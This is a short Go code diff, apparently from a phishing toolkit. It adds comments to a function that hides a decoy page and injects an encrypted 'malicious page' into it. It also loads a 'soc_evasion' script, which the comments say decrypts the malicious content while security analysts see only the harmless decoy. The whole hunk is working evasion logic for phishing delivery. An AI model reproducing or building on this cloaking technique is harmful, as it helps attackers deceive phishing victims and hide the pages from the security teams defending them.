@@ -200,8 +200,11 @@ func EmbedEncryptedPage(html string, decoyPageId int64, userId int64, key string
 
 	//hide decoy page html by default and only show if soc_evasion script doesnt decrypt malicious page properly.
 	decoyPage.HTML = strings.Replace(decoyPage.HTML, "<html ", "<html style=\"display:none;\" ", 1)
+	// Add jquery
 	decoyPage.HTML += "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js\"></script>"
+	// Add encrypted malicious page
 	decoyPage.HTML += "<script>var encrypted = " + "\"" + encryptedHTML + "\"" + "</script>"
+	// add soc_evasion script
 	decoyPage.HTML += "<script src=\"http://127.0.0.1:80/static/soc_evasion.js\"></script>"
 
 	return decoyPage.HTML, err
